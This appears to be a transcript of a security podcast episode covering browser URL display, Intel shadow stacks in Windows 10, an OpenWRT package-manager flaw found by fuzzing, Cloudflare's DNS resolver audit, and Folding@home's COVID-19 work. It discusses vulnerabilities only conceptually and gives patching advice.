I've talked about this before, and I think I must have taken our users step by step through it because one of my iPads is that way.  It's got persistent VPN.  And I forgot, I mean, it's been years now.  I took a little screenshot actually because I thought, oh, look at that, there it is.  That's what I thought.  It's got, under the General Settings menu, airplane mode, then WiFi, then Bluetooth, then cellular.  Then it's got an additional line that my other devices don't have, VPN.  And it's on, and I can't turn it off.  It just insists on being on.  I'm not even sure now what server it's VPNing to.  But that's the configuration on one of my iPads.  So it's definitely possible to do that.



On the other hand,  Apple's going to fix this.  I'm sure it's already been fixed in-house.  They're probably moments away from pushing out a fix to this because it's gotten a lot of attention in the industry, and Apple doesn't force themselves to stick to any schedule.  So I imagine within a few days this'll be fixed.  But for what it's worth, in the meantime, just bringing up the VPN, switching off WiFi, switching it back on, pushes everything back through the VPN tunnel, and you'll be good.



Wow, talk about sort of a ridiculous and fraught issue.  Google has continued to battle the industry and its own users over this display of both "www" and "https" in their Chrome browser URLs.  It insists on characterizing www and also m-dot, remember "m" as in the mobile version of a domain, as trivial.  And they just don't want to show it to people.  It was two years ago, back in 2018, that Google first announced its intention to have then Chrome 69 "elide," as they term it, the www from Chrome's displayed URL.  The uproar of opposition caused them to rethink that decision and end up backing away from it.



But someone somewhere inside Google is very stubborn about this, and they have not let it go.  Last summer, with the release of Chrome 76, we talked about it at the time, the www was finally disappeared from Chrome's URL display.  And many vocal people have been unhappy about it ever since.



At the time, Google wrote, they said:  "The Chrome team values the simplicity, usability, and security of UI surfaces.  To make URLs easier to read and understand, and to remove distractions from the registrable domain, we will hide URL components that are irrelevant to most Chrome users."  So of course, conversely, typical complaints are things like:  "It causes confusion in that what the user sees as the URL in the omnibox is not reflected in the actual value when copied, it does not match the SSL certificate, and there are many sites that do not automatically map the naked domain to www."  In other words, the www is often not superfluous.



Which brings us to today.  There must have been a large enough outcry over the loss of the "www" and the "https" to again cause Google, after what, 10 months or 11 months, to rethink it.  No, maybe eight months.  So Chromium developers are now testing a new omnibox context menu that will give users the option to "Always Show Full URLs."  So I guess it seems like it's a bit begrudging.  Google continues to believe that showing what it calls a "trivial subdomain" will distract users when making security assessments.  I mean, by this time everyone's used to www.  Sometimes it's there; sometimes it's not.



So this feature is currently in the Chrome 83 Canary build.  We're currently running 80 publicly; 81 is due soon, within a few weeks.  So it's in the 83 Canary build, appearing in a new context menu that drops down from the omnibox, you know, the thing that contains the URL.  So after this setting has been set, it will be retained until changed to always display the full web address, including "https" and "www" or "m-dot."  They outlined their plan for users to opt out of the URL snippage in a post on the bug tracker titled "Implement omnibox context menu option to always show full URLs."



The post's author, Livvie Lin, wrote:  "The omnibox context menu should provide an option that will prevent URL elisions for the entire Chrome profile.  However, showing the full URL may detract from the parts of the URL that are most important to making security decisions on a web page."  So again, they're not letting go of it, but they're acquiescing apparently to the constant annoyance that some old-school people have about actually seeing the URL that you are visiting.



So anyway, we will have, probably when Chrome 83 is out in the main release, we'll be able to right-click on the URL bar, select I want to see the truth, the whole URL.  We'll get it in Chrome, and we will keep it.  Oh, and I did see a note that it is for desktop versions of Chrome only.  I think it may not apply to our mobile smartphone versions.  So that's to be determined.



And then another interesting piece of good news.  Firefox 76 will finally stop assuming HTTP when nothing is specified.  Our listeners will know that this is something I've been commenting about being wrong about our browsers for some time.  With the majority of web sites now HTTPS, and there being a definite bias in favor of moving everything there, over to HTTPS, as I've noted several times, it has seemed wrong to me that if someone were only to enter Amazon.com into their web browser, their browser would assume the protocol prefix of http://.  So then first jump to http://amazon.com, whereupon Amazon's server would almost always, as mine does, GRC does, redirect you over to https://amazon.com.



Anyway, Firefox is going to make the change.  On their Bugzilla page, which is both where bugs go to die and new features are born, sort of being bugs because they don't yet exist, there's an entry for Bug 1613063 which is flagged as "experimental," and it's titled "HTTPS Only Mode."  The description reads:  "Currently, if a Firefox user types foo.com in the address bar, then our internal machinery establishes an HTTP connection to foo.com.  Within this project we will expose a preference which allows end users to opt into an 'HTTPS Only' mode which tries to establish an HTTPS connection rather than an HTTP connection to foo.com.  Further," they said, "we will upgrade all subresources on the page to load using HTTPS instead of HTTP."



So then finally they concluded, under "Implementation Considerations," they said:  "For top-level loads which encounter a time-out, we could provide some kind of error page with a button which would allow the end user to load the requested page using HTTP."  Meaning that, if their default promotion from HTTPS to HTTP fails, then they would result in a page saying, okay, fine, try using HTTP.  So the user would press that.



Then they said: " For subresource loads we would fail silently and just log some info to the console."  So this setting will initially be off, but then power users could flip it on if they wished to in the UI.  And I'm sure that their instrumentation will monitor the experiences of those who choose to turn it on.  And then at some point in the future, assuming that all goes well, they would flip it to "on" and then provide a useful UI fallback.  So anyway, nice to see that we're moving forward.  At this point I think that really makes sense, if you just put in the root domain name.  Why assume HTTP; you know?  Actually it would be nice if the browser did both and waited to see who responded.  But they're not doing that.



I mentioned last week that Google had put future Chrome releases on hold; that they were going to, like they were stopping work, they said, on any feature releases for the next Chrome.  We're currently on 80, so that would have been for 81.  They were only going to be doing bug fixes.  But I guess they got comfortable pretty quickly with the way things were working with their engineers telecommuting.  So that's no longer the case.



In a Chrome blog last Thursday, Google updated, saying that it plans to resume work on Chrome releases.  They said that Chrome 81, which was originally scheduled for release on March 17th, has now been rescheduled for release on April 7th, so a couple, what, I guess next week, around the middle of the week.  And at that time web developers and sysadmins would have had time, or their web developers and system administrators would have had time to adapt to their new working conditions.



So they're also saying that this does, I guess because it kind of squeezes it, it will result in dropping release 82.  They're just going to skip the number altogether with its new features, which will be merged into release 83 and subsequent future releases.  And 83 is now expected to be released sometime around mid-May.  So I think they basically just postponed 81 a couple weeks because they've got an existing release pipeline set up.  They're going to just skip over 82.  There won't be one.  And they'll jump over to 83 rather than forcing a renumbering of everything else downstream.



Last week we also noted that Edge was pausing their own releases to stay in sync with Chrome.  And then last week, citing the impact on its customer base from COVID-19, Microsoft announced that, starting in May, optional Windows 10 cumulative updates would also be paused.  So also a pause on the Windows 10 side.  And as we know, Mozilla did not pause Firefox updates, but it did roll back the termination of TLS 1.0 and 1.1 so that access to government-based websites that weren't yet running 1.1 and 1.2 would be unimpeded.  So that's cool.



Okay.  So a bit of a deep dive on a forthcoming feature for Microsoft Windows 10.  This is to support something known as shadow stacks.  It's something we talked about quite a while ago, so we'll sort of refresh what's going on and what problem this solves.  But this is very welcome for future versions of Windows 10.  Last Wednesday, Microsoft's Hari Pulapaka, who's their group program manager for the Windows kernel, updated the world on the state of Microsoft's plans to add hardware-enforced stack protection to Windows.  In this case, hardware-enforced stack protection takes the form of shadow stacks.



Through the last several decades, as we know, we've talked about the problem with the stack, buffer overruns, this concept of stack canaries, adding a little unpredictable bit of data that an attacker wouldn't be able to have to the stack in order to verify that there hasn't been an overwrite of a return address before the processor takes the return.  You know, there have been all kinds of ways to try to shore up the problem that the stack inherently presents.  In this case it requires hardware support from Intel in the form of a new feature being added to the most recent chips known as CET, Control-flow Enforcement Technology.



And back when we talked about the way processors operated in general, I talked then about how the stack itself, the concept of an execution stack, is one of the key innovations in the design of CPU architectures.  It's been around for a long time, but not forever.  For example, the earliest DEC PDP minicomputers and other early minicomputers back in the '70s did not have a stack.  When I was writing those demo programs for the PDP-8s behind me, those PDP-8 emulators, the lack of a stack was an annoyance because it's so handy.



And one of the primary things that a stack does is manage subroutine calls, that is, you're executing code.  You want to call a subroutine, a commonly used procedure to do something, for example, maybe it's to get a keystroke from the keyboard.  And because in many different places in your code you may want to get a keystroke from a keyboard, rather than duplicating that code, the keyboard reading code all over, you just do it once.  You create a routine that does that.  And instead you call that routine, that is, you jump to it from all over in your code.  In low-level computer programming, a jump instruction just changes the location where the computer is running.  A subroutine call somehow saves where you are so that, after running the subroutine, you can return to it.



Well, the PDP-8 doesn't have a stack.  So they came up with a kludge which was to store the return address in the first storage word of the routine, and then to start executing with the second storage word in the subroutine so that the subroutine would return to its caller by looking at the address in the first word of the routine and jumping there, an indirect jump through the first word of the routine.  Well, that was clever, and it was simple to implement in logic.  But one of the problems is that you cannot have recursion if you do that.  That is, you could never have that routine call another routine that  might then come back and call that first routine because it would overwrite the return instruction that was first stored the first time the routine was called.



The beauty of a stack is it solves this problem with recursion in a very elegant fashion.  The stack is just a region of memory set aside in the system, and a register points to what is kind of arbitrarily decided as the top of the stack.  Normally, stacks grow downward, that is, as you push data on the stack, the pointer is decremented to earlier or lower addresses in memory to successively store that data.



Okay.  So later minicomputers like the PDP-10, which was a 36-bit machine, and the famous PDP-11 where Unix was first written, thank goodness it was a stack-based machine because otherwise Unix would have been a lot harder to pull off.  I don't think they would have bothered, actually.  I mean, a stack is so incredibly useful.  So the main characteristic of a stack is that it's visible to the programmer.  As I said, the processor has a pointer to the top of the stack, called the "stack pointer."  And there are instructions for pushing various amounts of data onto the stack for temporary storage and popping it off of the stack when it's no longer needed, in order to retrieve it, or in some cases just to throw it away.



When parameters are passed to a procedure in a procedural programming language, the parameters are typically passed by having the caller of that procedure push those parameters onto the stack in a predefined order.  Then the calling procedure then calls the subroutine, the procedure that it's looking for, which pushes the caller's return address onto the stack as the system then jumps to the beginning of the procedure.  And if that procedure needs to allocate some space for local variables, that space will be allocated by moving the stack pointer downward to sort of create a buffer region of available space, again on the stack.



So the point is that the stack serves as a sort of multifunction scratch pad which does a very efficient job of giving transient data a place to live.  And the stack is visible to the programmer, whose caller's parameters and its own local variables are all present and accessible by offsets into that stack.  And as we know all too well, programmers often allocate, unfortunately, temporary communications buffer space on the stack, which if they're not careful allows more to be read onto the stack, thus overflowing data and causing buffer overruns on the stack.  But when all goes well, a stack is an incredibly elegant innovation for CPUs.



Okay.  So what's a shadow stack?  I deliberately noted the many different sorts of things that cohabitate and share that single stack.  And as we've seen historically, the biggest danger is that the control-flow data, that is, the subroutine return addresses, share the stack with the many other sources and types of non-control-flow data.  And remember, all of it is visible to the programmer, that is, it's their stack.  It's the currently executing thread's stack.  So, for example, if a programmer wished to cause his subroutine to return somewhere other than back to its caller - hard to see a good use case for that.  But if the programmer wanted to, it would be trivial for him to arrange.  He'd simply overwrite the correct subroutine return address on the stack, waiting, with any other address in the system.  And upon executing from the subroutine, the CPU would dutifully read that modified address from the stack and jump there.



And of course the point is, if malicious code somehow managed to arrange to do the same thing, that opens up a huge vulnerability.  So by comparison, a shadow stack, this hardware-enforced shadow stack lives like its name suggests, in the shadows.  Unlike the primary system stack, it is not visible to the programmer.  It's not something the programmer can see or has any access to.  This means that it's also not visible to any malicious code that might get loose.  So Intel has added this shadow stack feature to their future CET-equipped CPUs.



Unlike the main system stack, which contains this wonderfully dynamic hodgepodge of data and control-flow, the shadow stack contains only a - it's only a stack of return addresses.  And it's managed by the CPU behind the scenes invisibly.  When a programmer makes a call to a subroutine procedure, this CET-equipped Intel CPU pushes the return address, the caller's return address, onto both the main system stack and the invisible shadow stack.  The main stack receives and holds all manner of other information, as I was talking about, before and after and during the call.



But the shadow stack only has return addresses.  When the called procedure eventually returns, executes a return instruction, this CET-equipped Intel CPU pops the return address both from the main stack and also separately behind the scenes from the shadow stack, and it compares them.  They are guaranteed to match, so long as nothing nefarious or maybe inadvertent has modified the return address on the system stack.  So it performs a nice sort of local stack verification in hardware, stack status verification in hardware.  But those two return addresses are guaranteed not to match if anything might have modified or overwritten the original value stored on the big visible system stack.



So this makes for a very slick way to enable Intel's CPU hardware to catch any of the very common stack overwrite mistakes, as well as buffer overruns and other common stack-based security flaws.  It's going to have, you know, essentially zero software or timing overhead, operates entirely on hardware based on this additional microcode and hardware support from Intel.  It has been lagging.  Last Wednesday's announcement was that support of this technology was now under development by Microsoft, and a preview is available in the Windows 10 Insider Preview builds, you know, the so-called "fast ring."



The specification for this has been public for several years.  They first started talking about it about four years ago, in 2016.  And support for it has preceded the wide availability of the hardware that actually supports it.  The very popular GCC compiler suite and Glibc both added support several years ago.  But once all of the pieces come together, what we'll effectively have is a significant step forward in our functional CPU architecture.



As I've said, the innovation of the stack as a general purpose, very efficient catchall for the storage of temporary dynamic data and control-flow has been a huge innovation in PC architecture, or CPU architecture.  But it's always suffered from being also a little bit brittle and prone to either inadvertent mistakes or malicious abuse.  So adding this invisible control-flow shadow stack will solve this problem of this multipurpose stack very elegantly for the industry.



I'm super excited that Windows 10 will be getting this.  And Intel's chips, I tried to dig around and figure out at which point this would actually appear.  I was unable to find anything definitive about which version of Intel hardware did actively have this.  But it's something where the Intel, I don't know if it's Spectre and Meltdown or if they realized, oh, my goodness, we've got some other problems in the microcode with this that's kept pushing it back.  But people have been waiting for this to get added to the Intel architecture for quite a while, and it looks like we're seeing it finally beginning to happen. 



And it must be in the latest hardware.  Otherwise there would be nothing to test it with under Windows 10.  But that'll be nice when this problem is solved because, as I've been saying, it feels like we have some fundamental problems with the way our software works, and it needs to be rethought.  One possibility is to make our languages far more automatic, that is, take the power out of the hands of the programmer, although programmers lose power kicking and screaming.  The alternative is to come up with good ways to make our hardware help these problems much more than they have been.  And this is just a perfect example of that happening.



So it's going to be great when we have Windows support.  And it looks like, as soon as we get the various Linuxes and probably Mac recompiled with these features turned on, they'll have them, too.  Oh, and if these features are turned on, and you're running on a chip that lacks the hardware support, it's just ignored.  It just doesn't raise an exception because there is no comparison of the two stacks performed during a return jump.



So we have a instance of the press running around again with its hair on fire, screaming in one case "Patch now!  Critical flaw found in OpenWRT router software."  Okay, kind of.  The situation is not good, but it's also not the end of the world.  But anyone who would knowingly be running OpenWRT, and since that's an open source alternative that's loaded on top of other router firmware, I imagine anybody who is running OpenWRT knows they are.  So there is a potential supply chain exploit, and it's very good that it was found and has now been fixed since it might conceivably have been exploited in either targeted or widespread attacks.



The problem was discovered and responsibly disclosed earlier this year by a guy named Guido Vranken, who was working with a company called ForAllSecure.  And I think our listeners will find his description of his discovery interesting.  I have the link for the full blog post.  I'm just reading the top of it because he then goes into a much more detailed description.  But just his introduction is neat.  He said:  "For ForAllSecure, I've been focusing on finding bugs in OpenWRT using their Mayhem software."  And Mayhem is a fuzzer.  We were talking about fuzzers recently.



He said:  "My research on OpenWRT has been a combination of writing custom harnesses" - meaning interfaces for the fuzzer - "running binaries of the box without recompilation, and manual inspection of code."  He said:  "I found this vulnerability initially by chance when I was preparing a Mayhem task for Opkg."  Opkg is the OpenWRT package manager.  Anyway, he said:  "Mayhem can serve data either from a file or from a network socket.  Opkg downloads packages from downloads.openwrt.org, so my plan was to let this domain name point to 127.0.0.1 from which Mayhem is serving."



He said:  "To test if Opkg would indeed download packages from a custom network connection, I set up a local web server and created a file consisting of random bytes.  When I ran Opkg to install a package, it retrieved the file as I had intended, but then threw a segmentation fault."  You know, it blew up based on this noise that it had downloaded.  So of course we know, whoops, that's a red flag.



He said:  "I didn't understand why an invalid package would cause this error.  After all, the package should not be processed if the SHA-256 hash was incorrect.  My initial hunch was that Opkg would download the package, unpack it to a temporary directory, and only then verify the SHA-256 hash" - excuse me.



LEO:  You want to take a little break?



STEVE:  Just a little sip of coffee.



LEO:  I didn't give you your usual coffee break.  Sorry.



STEVE:  Thank you, buddy.



LEO:  Yeah, yeah, yeah.



STEVE:  So anyway, so he said:  "...and only then verify the SHA-256 hash before definitively installing it to the system."  He said:  "I suspected that the unpacker couldn't deal with malformed data."  Okay, there's another red flag, but we're going to run across many of them before we're done here.  He said:  "Like the file with random bytes served from my web server."  And I have to mention that it should raise an alarm for everyone that he was able to set up a web server which Opkg would download from because, like, wait, what?



LEO:  Not good.



STEVE:  Like, what?  Uh-huh.  So he said:  "Further inspection" - I hope everybody with OpenWRT is sitting down at this point.  "Further inspection showed that the SHA-256 hash wasn't being checked at all, which is the basis of the vulnerability at hand."  Meaning this first of many.  He said:  "I was right about the unpacker being buggy, though; malformed data would lead to a variety of memory violations." 



He said:  "Once I confirmed that Opkg would attempt to unpack and install any package it downloads, I was able to recreate the findings with Mayhem with just a slight modification to Opkg."  He said:  "I set up a Mayhem task for 'opkg install attr.'"  He said:  "Attr is a small OpenWRT package," obviously to show attributes.  He said:  "And implicitly, Mayhem was able to find the remote code execution bug by detecting the memory bugs in the package unpacker.  If OpenWRT's SHA-256 verification had worked as intended, Opkg would simply discard the package and not process it, and no segmentation faults would transpire."



He says:  "Mayhem is capable of fuzzing binaries without recompilation or instrumentation.  Coming from a workflow that involves writing many custom harnesses for software libraries," he says, "which Mayhem also supports, this has been a delightful experience, and it has allowed me to set up targets for dozens of OpenWRT applications in just weeks, and more vulnerability disclosures are forthcoming."



Okay.  So in other words, first of all, there are a bunch of problems with the OpenWRT codebase that should put everyone on, well, notice, and frankly on edge.  But first and foremost is that its package manager has not been bothering to check the hash of anything it downloads.  And I should mention since 2017.  And believe it or not, this problem is significantly compounded by the fact that these updates are over HTTP.  Yes, I'll say it again, HTTP and not HTTPS.  That's the only way this guy was able to set up a local web server on 127.0.0.1 and probably used the hosts file to redirect whatever that was, downloads.openwrt.org, to his local IP.  If you are downloading stuff over HTTP, as we know, that means there's no certificate to verify that the package is being obtained from the correct server, which makes DNS spoofing or any other type of man-in-the-middle-style traffic interception easy to pull off.



I guess I'm not quite back to a hundred percent.  But nearly so.



LEO:  Well, it could just be, you know, allergies or something.



STEVE:  Just a cough.  Okay.  So the OpenWRT project has known about this since the beginning of the year.  They recommend carefully upgrading - I think I put the word "carefully" in because, again, if it's over HTTP, you've got to be sure you're downloading your update from the proper place - to the latest version.  That means making sure you're connecting to the correct server.  Make sure that your DNS has not been changed.



And interestingly, although I haven't reported it just because I just didn't have time with everything else that's been going on, there have been a bunch of router DNS attacks recently.  So definitely make sure that your router is using the valid DNS servers that you deliberately configured it for and that it might not have been changed because of course that is the trivial way that you pull off a man-in-the-middle to a non-HTTPS site, just by redirecting downloads.openwrt.org.



Okay.  So the bug was introduced.  It's been given CVE-2020-7982.  It was introduced in early 2017.  It affects OpenWRT versions 18.06.0 through 18.06.6, so that range of 18.06 versions, and 19.07.0, and also separately the OpenWRT LEDE fork version 17.01.0 through 17.01.7.  The fix was applied to an updated version of that 18.06 series, taking you to 18.06.7, which is what you want if you were using 18.06, and to 19.07.1, if you currently have 19.07.0.  It was released at the beginning of February.  It's been around.  Maybe your device has updated itself.  In any event, you want to get that fixed if you're an OpenWRT user because now it's been made publicly widespread, widely known, and people who don't fix that could find themselves victims of the problem.



Cloudflare and 1.1.1.1 had themselves audited by KPMG.  As we know, Mozilla's decision to route all of its browsers' DNS queries by default via DoH, DNS over HTTPS, to Cloudflare raised a bunch of noise when it was first announced.  Many creaky old-school Unix diehards chafed over the loss of DNS's inherent distributed design.  You know, people complained that this was, you know, becoming sort of a monoculture of DNS, if all Firefox users' DNS went through one provider.  And perhaps some or much of this was due to their lack of long-term knowledge of who Cloudflare is.  You know, I wasn't worried.



They may have believed, if they didn't know otherwise, that it was just some random provider.  And in truth, if Cloudflare was not as well known to me and us, you know, Leo and our listeners, I'd have been concerned by the idea of trusting some random single provider.  But for us, Cloudflare is not some random provider.  We do know Cloudflare and many of the people behind the name.  So it always seemed like an excellent choice and a good idea.  And we have said, as our own ISPs decide that they want to bring up DNS over HTTPS, they're welcome to do that with their own local DNS servers, and then people could choose not to focus on 1.1.1.1.



But Cloudflare has made some very strong both claims and commitments and promises about the way they're going to manage and their eyes-off and hands-off policy for all of the DNS traffic which then will be transiting their network.  So the good feeling we have always had about them has been solidified because they opened for a long period of time last year their entire network to KPMG for the sake of allowing a fully independent audit.  The auditor's report has a ton of detail, bullet points about specifically the things they did and saw and found and were fine about.  And I've got a link in the show notes to the entire KPMG report.



But it concludes:  "In our opinion, management's assertion that the 1.1.1.1 Public DNS Resolver was effectively configured to support the achievement of Cloudflare's Public Resolver commitments for the period from February 1, 2019 through October 31, 2019, based on the criteria above, is fairly stated in all material respects."  In other words, they got a green light from an independent KPMG auditing group who they let see exactly what they were doing.



So if anyone was harboring any concerns, I'm not surprised by this outcome.  I'm delighted by it.  And props to Cloudflare for saying, okay, we're going to handle this, and we'll let somebody come in and take a look at what we're doing.  And actually, based on the detailed report, they really dug in.  This was not some token transient BS bureaucratic audit.  It was down at the edge resolver, syslog is logging or not logging, and what is logging, and the retention of packets and, I mean, it was in real detail.  So I came away completely pleased and convinced.



Oh, and I wanted to acknowledge everybody - and yes, even you, Evan Katz - for informing me that the new Edge Chromium browser is going to be receiving vertical tabs.  Yay.



LEO:  That's your feature that you keep using Firefox, the sole feature that keeps you using Firefox.



STEVE:  Yes, it is.  Nothing replaces that, yeah.  And of course all of our listeners know it.  And so I was the subject of a Twitter storm.  They're going to be adding vertical tabs.  And all I can hope is that Google will, for whatever reason, who has stubbornly refused to do so, will say, hmm, looks kind of popular over there.  Looks kind of good.  Maybe we should consider doing that because...



LEO:  Tell me why you like vertical tabs?



STEVE:  Well, because a tab is vertical.  I mean, I'm sorry, a tab is horizontal.  A tab is horizontal.



LEO:  Yeah, it is, yeah.



STEVE:  And so you can stack them much more efficiently vertically than you can stack them horizontally.  And all of our screens are no longer 4x3.  They're all 16x9 or more.  So typically, if you bring your browser full screen, now it's just sitting in, you know, your browser is sort of - the content is in the middle with a lot of dead space on both sides.  So put the tabs there.  You can see them easily.  It just makes sense to sort of square the browser window by filling the left side with tabs that work vertically.  It just seems, like, crazy that it isn't a default.  So anyway, apparently someone at Microsoft agrees.  And, yay, Edge will be getting those with a Chromium engine on the back end.  So everybody gets to win.



LEO:  How do you - you're not using an extension to do it in Firefox.  You're just using the little browser, what do they call that, the little browser gutter on the left; right?  You're turning that on?



STEVE:  Well, no.  No, no.  I actually do have...



LEO:  You use an extension for it, okay.



STEVE:  I have something called Tree, yeah, I have Tree Style Tabs, which creates a hierarchy of tabs, which I like.  I don't think Firefox does it natively.



LEO:  Well, it does, but it's kind of a weird - here, I'll put it on the left so you'll feel more at home.  This is that gutter I was talking about.  And you can have it be a variety of things, including synced tabs, which is all the tabs that all your machines have.



STEVE:  Right.



LEO:  So you turn off the - I don't know.  I still have tabs, though, so I don't really know how that would go. 



STEVE:  Yeah.



LEO:  So you'd want to have the extension.



STEVE:  Yeah.  I do use one.  And there are a number of vertical tab extensions for Firefox.



LEO:  Weird that, I mean, if it's just an extension, that Chrome doesn't have an extension that does it.  That seems odd.



STEVE:  There is one.  I think Chrome's UI for some reason fights it.  There is an extension that hangs a separate window, sort of as a sidecar, off the side.  But it just doesn't feel right.  And besides, I've solved the problem with Firefox.  I just want to have it.



LEO:  You don't need it.  You don't care.



STEVE:  Yeah.  Although I would love to have it native.  And some day the world is going to capitulate, apparently, and we're going to get vertical tabs.



LEO:  That's good.



STEVE:  SQRL.



LEO:  SQRL.



STEVE:  Yeah, SQRL now has a beautifully written, open source, cross-platform Windows, Linux, and macOS native SQRL client and library.



LEO:  Nice.



STEVE:  So SQRL for Linux, SQRL for macOS, no more need to use WINE.  I meant to put screenshots in the show notes, and I just forgot.  This is the work of Jose Gomez and Alex Hauser.  Jose previously wrote the OAuth2 provider for SQRL, and Alex did a lot of work with Daniel's Android client.



LEO:  Yeah.  Jose helped me get it on the TWiT Community, yeah.



STEVE:  Right, right.  So this client now has a new forum over on GRC's SQRL forums at sqrl.grc.com, not a trivial subdomain.  And the project is being hosted on GitHub.  I've got the link in the show notes for anyone who is interested.  It's github.com/sqrldev/SQRLDotNetClient.  So those guys have just produced a beautiful cross-platform client.  So all of our desktops are covered now.



And as for SpinRite, I was, as I noted, a bit slowed down by what I strongly suspect, without evidence yet, was COVID-19.  As we know, there's increasing talk about an antibody test, and I will be first in line for it, as soon as it's available.  I'm going to be very disappointed...



LEO:  We should take bets on whether you had it or not.



STEVE:  Yeah, I just - Lorrie actually thinks not.  She thinks...



LEO:  Because you didn't have a fever, which is, as we were talking about it before the show, a common symptom.



STEVE:  It is.  It is.



LEO:  Like very common, yeah.



STEVE:  It is.  Oh, I also didn't have - I had respiratory compromise, I mean, I had this weird dry cough.



LEO:  You're still coughing, Dude.  You definitely had that.



STEVE:  Yeah.



LEO:  Whatever it was you had.



STEVE:  For weeks.  So anyway, the moment there will be an antibody test.  And, you know, it's going to be a few more weeks, I think.  But there's a big push for it because people who are positive for the antibody are presumably immune for some length of time.  The most recent medical feeling is one to three years.  We just don't really know.  But based on other known coronaviruses, the expectation is at least a couple years of immunity.  And then you may get it again, but be asymptomatic.  Your body might just deal with it.



LEO:  Right, or it'd be more mild.



STEVE:  Exactly.  Exactly.  Anyway, so while I was unable to code, I did manage to read the second of Hamilton's "Salvation" trilogy, and it did not disappoint.  I'm now one book behind on Ryk Brown's "Frontiers Saga."  I've read and very much enjoyed the first 27 books, so book number 28 awaits.



LEO:  Geez.



STEVE:  But those are much lighter reading.



LEO:  Geez, that's a lot.



STEVE:  All that said, I was back to work on SpinRite's AHCI driver over the weekend, and I will be returning to it this evening, and I'm hoping to have some new code for our anxious SpinRite testers to test soon.  So moving forward on all fronts once again.



LEO:  Before we get to Folding,  I did want to mention there's been another Marriott breach.



STEVE:  Oh, 5.2 million, yup.



LEO:  You saw it, okay.  I wasn't sure if you missed it or not.  This one's not as significant because they got credentials for some Marriott employees through the app.  It was actually a pretty hare-brained scheme.  And I guess there was no protection.  So having employee credentials gave them access to guest information for 5.2 million customers since last January, since January.  So, yeah, once again, guest names, addresses, birthdays, emails, phone numbers, and loyalty reward programs for both hotel and partner airlines.  But no passport information, no driver's license, no passwords. 



STEVE:  Yeah.  There is a service you can use to find out if you are subject to the breach.  And I don't know.  Maybe they'll say they're sorry.



LEO:  They didn't say they were sorry this time.  We're not sorry.  Sorry, not sorry.  It was a breach.  Sorry, not sorry.



STEVE:  Yeah, wow.



LEO:  Anyway, you left it...



STEVE:  Someday, Leo, we're going to figure out how to make a secure website.  But that doesn't seem to be happening anytime soon.



LEO:  You left it out because you thought it was insignificant, or just you ran out of space?



STEVE:  Well, yeah.



LEO:  Just another one.



STEVE:  I looked at the, what is it, 358 million from the Starwood Hotel's breach.  And I thought, okay, you know.



LEO:  If you're a Marriott person, you're used to it.



STEVE:  Breaches are happening now just so commonly.



LEO:  It really is true, isn't it, yeah.



STEVE:  In fact, there was even some discussion about whether we now should really call it a "breach."  If someone puts their data on the Internet, is it a breach or an unauthorized access?



LEO:  That's a good point.



STEVE:  You know, it's like, well, you published your database on the Internet.  You shouldn't have, but you did.  So it didn't really require any great hacker skills in order to download the database, which was there on an API.  So is that a breach?  You're unhappy, but maybe not.



LEO:  You gave them the information, yeah.



STEVE:  Yeah.  So we now can donate our unused CPU cycles to help provide answers to COVID-19.  It's a happy coincidence that just as the SETI project decided that it just had no longer any need for the raw signal processing number crunching that all of its users were doing, that a crucial new need for distributed computing at massive scale would arise, because our unused CPU cycles can now help to increase our understanding of the structure and function of the COVID-19 virus.



It turns out that molecular modeling can be used to identify therapeutic drugs that might be of use in preventing the COVID-19 spike protein from binding to the ACE2 receptors of the cells in our lungs.  In other words, our medical science and molecular modeling technology has progressed to the point that the field of computational biology is now a thing.  And, oh, baby, is it compute-intensive.  But it's possible to run simulations entirely using very sophisticated math to predict the 3D molecular shape and thus the interactions between biological compounds.



Wikipedia has a terrific and up-to-the-date intro that even mentions about Folding@home, which is even mentioning COVID-19.  They said:  "Folding@home" - and that's FoldingAtHome.org, for those of you who don't want to wait - "is a distributed computing project for performing molecular dynamics simulations of protein dynamics.  Its initial focus was on protein folding, but has shifted more to biomedical problems such as Alzheimer's disease, cancer, COVID-19, and Ebola.



"The project uses the idle processing resources of personal computers owned by volunteers who have installed the software on their systems.  Folding@home is currently based at the Washington University in St. Louis School of Medicine, under the directorship of Dr. Greg Bowman.  The project was started by the Pande Laboratory at Stanford University, under the direction of Professor Vijay Pande, who led the project until 2019.  Since 2019, Folding@home has been led by Dr. Greg Bowman, who is a former student of Dr. Pande."



They wrote:  "The project has pioneered the utilization of CPUs, GPUs, PlayStation 3's, Message Passing Interface used for computing on multicore processors, and some Sony Xperia smartphones" - okay, don't do that - "for distributed computing and scientific research.  The project uses statistical simulation methodology that is a paradigm shift from traditional computing methods.  As part of the client-server model network architecture, the volunteered machines each receive pieces of a simulation (work units), complete them, and return them to the project's database servers, where the units are compiled into an overall simulation.  Volunteers can track their contributions on the Folding@home website, which makes volunteers' participation competitive and encourages long-term involvement."  It's like, hey, how many work units have you achieved, you know, and so forth.



"Folding@home is one of the world's fastest computing systems."  Get a load of this.  "With heightened interest in the project as a result of the 2019-2020 coronavirus pandemic, the system achieved a speed of approximately 768 petaflops, or 1.5 x86 exaflops at March 25, 2020" - so last Wednesday - "making it the world's first exaflop computing system.  This level of performance from its large-scale computing network has allowed researchers to run computationally costly atomic-level simulations of protein folding thousands of times longer than formerly achieved.  Since its launch on the first of October 2000, the Pande Lab has produced 223 scientific research papers as a direct result of Folding@home.  Results from the project's simulations agree well with experiments."



So basically this is doing, out on this massive network - as I mentioned to you before, Leo, the sum of processing power by the world's top seven fastest supercomputers is less than the current power of the Folding@home network.  Since February, the Folding@home community has been working on the computationally heavy work of finding out how the COVID-19 virus protein binds to cells.



When the outbreak was picking up steam, the Folding@home project asked for volunteers to donate their computers' unused computational power to help accelerate the open science effort to develop new lifesaving therapies as part of a collaboration of multiple laboratories around the world.  Folding@home says, get this, there's been a roughly 1,200% increase in contributors, with 400,000 new members signing up in the past two weeks.  So I would imagine the listeners of this podcast will probably be responsible for another serious jump in that number.



Due to the project basically being swamped recently, the Folding@home researchers are working to generate enough work for this massive influx of new processing power to tackle.  They indicated that there might be a bit of downtime, that is, like people would be looking, and their Folding@home cycles were not being sucked up, while new simulations are being set up.  They said:  "Usually your computer will never be idle, but we've had such an enthusiastic response to our COVID-19 work that you will see some intermittent downtime" - meaning lack of use of the resources that you are making available - "as we sprint to set up more simulations.  Please be patient with us.  There is a lot of valuable science to be done, and we're getting it running as quickly as we can."



So I would say a very worthwhile effort for those of us who leave machines on and unattended while we're not using them.  Let it download little work packets of computational biology to perform, and then get that work done and send the results back to them.  We'll all be doing our share.  Basically, a mathematical biological laboratory, which is just so cool.



